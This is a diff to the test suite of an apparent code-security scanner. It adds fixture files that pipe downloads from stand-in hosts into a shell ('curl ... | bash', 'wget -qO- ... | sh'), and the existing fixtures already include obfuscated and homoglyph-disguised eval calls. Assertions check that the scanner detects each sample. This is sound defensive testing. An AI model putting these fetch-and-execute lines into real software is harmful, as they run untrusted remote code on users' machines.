@@ -185,6 +185,10 @@ ADVERSARIAL = {
     "py/inline_os.py": "__import__('os').system(input())\n",
     "hide/names.js": 'var m = global["\\x72\\x65\\x71\\x75\\x69\\x72\\x65"]("child_process");\n',
     "hide/indirect.js": "(0, eval)(atob(p));\nwindow['ev' + 'al'](atob(p));\n",
+    # a download piped into a shell: first-party code (SC-PIPE-SHELL), a dependency (SC-IMPORT-RISK)
+    "bin/helper.js": 'const { execSync } = require("child_process");\nexecSync("curl -s https://collector.invalid/x | bash");\n',
+    "tools/fetch.py": "import subprocess\nsubprocess.run('wget -qO- https://files.invalid/i.sh | sh', shell=True)\n",
+    "node_modules/evil/fetch.js": "require('child_process').execSync('curl -fsSL https://files.invalid/x | sh');\n",
     # names spelled with look-alike letters (SC-HOMOGLYPH)
     "uni/lookalike.js": "const \u0435val = eval;\n\u0435val(x);\nif (isAdm\u0456n) {}\nconst isAdmin = 1;\nconst v\u0430lue = 2;\neva\u200dl(y);\n",
     "uni/lookalike.py": "\u0435val = eval\n\u0435val(input())\n",
@@ -379,6 +383,10 @@ class EngineParityTests(unittest.TestCase):
                                  ("SC-HOMOGLYPH", "uni/lookalike.py")):
                         self.assertIn(want, found)
                     self.assertEqual(("SC-HOMOGLYPH", "node_modules/evil/lookalike.js") in found, label == "--deps")
+                    self.assertIn(("SC-PIPE-SHELL", "bin/helper.js"), found)
+                    self.assertIn(("SC-PIPE-SHELL", "tools/fetch.py"), found)
+                    self.assertEqual(("SC-IMPORT-RISK", "node_modules/evil/fetch.js") in found, label == "--deps")
+                    self.assertNotIn(("SC-PIPE-SHELL", "node_modules/evil/fetch.js"), found)
 
     def test_dependency_checks_agree(self):
         """--deps follows a dependency's install hook to what it runs and
